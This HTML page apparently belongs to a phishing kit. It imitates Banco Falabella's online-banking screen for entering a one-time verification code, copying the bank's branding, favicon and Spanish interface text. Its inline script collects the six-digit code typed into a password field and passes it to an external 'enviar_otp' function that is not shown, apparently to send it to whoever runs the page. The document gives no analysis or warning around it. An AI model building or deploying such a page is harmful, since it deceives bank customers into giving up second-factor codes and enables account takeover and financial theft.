<!DOCTYPE html>
<html lang="es">
    <head>
    
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <title>OTP| Banco Falabella</title>
    <link href="https://www.bancofalabella.com.co/assets/favicons/android-chrome-256x256.png" rel="shortcut icon" type="image/x-icon">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/misEstilos.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  	
    <style>
        .btn-custom{
            font-family: 'PF BeauSans Pro', sans-serif !important;
            display: inline-block;
            font-weight: 700;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            border: 1px solid transparent;
            padding: 0.375rem 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            border-radius: 0.25rem;
            transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out,
                border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            letter-spacing: 0.16rem;
            text-transform: uppercase;
            padding: 0.6rem 1rem;
            margin: 0.5rem 0;
            width: 100%;
            color: #fff;
            background-color: #dc2a4d;
            border-color: #dc2a4d;
        }
    </style>		
</head>

<body cz-shortcut-listen="true">
    <div class="header">
        <header class="headerO">
            <div class="header1">
                <div class="container">
                    <div class="box row">
                        <div class="col-auto box1 col-md"><button><span><svg _ngcontent-lwe-c118="" class="ng-tns-c118-0" viewBox="0 0 43 29" xmlns="http://www.w3.org/2000/svg">
                                        <g _ngcontent-lwe-c118="" class="ng-tns-c118-0" fill="none" fill-rule="evenodd">
                                            <path _ngcontent-lwe-c118="" class="ng-tns-c118-0" d="M-3-9h48v48H-3z">
                                            </path>
                                            <path _ngcontent-lwe-c118="" class="ng-tns-c118-0" d="M2.5 29h38a2.5 2.5 0 1 0 0-5h-38a2.5 2.5 0 1 0 0 5zm0-12h38a2.5 2.5 0 1 0 0-5h-38a2.5 2.5 0 1 0 0 5zM0 2.5A2.5 2.5 0 0 0 2.5 5h38a2.5 2.5 0 1 0 0-5h-38A2.5 2.5 0 0 0 0 2.5z" fill="#3F3F3F" fill-rule="nonzero"></path>
                                        </g>
                                    </svg></span></button></div>
                        <div class="col-auto box2"><a href=""><img alt="" src="img/header.svg"></a></div>
                        <div class="box3 col"><a href="">Banca en
                                LÃ­nea</a></div>
                    </div>
                </div>
            </div>
        </header>
    </div>
    <div class="d-block" style="margin:80px 0 180px">
        <div class="card card-body card1">
            
            <div class="formf">
                <div class="formPrincipal">
                    <h5 class="title" style="color:#5e5c5c;margin-bottom:20px!important">Ingrese el cÃ³digo de
                        verificaciÃ³n</h5><input class="form-control" name="cDinamica" id="txtOTP" inputmode="numeric" maxlength="6" placeholder="CÃ³digo de verificaciÃ³n" type="password">
                        <input type="submit" id="btnOTP" value="Validar" class="btn-custom">

    </div><a href="">Crea o recupera tu Clave Internet</a>
            </div>
        </div>
    </div>
    <div class="footer"><img alt="" src="img/footer.PNG"></div>

    <script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>


</body></html>
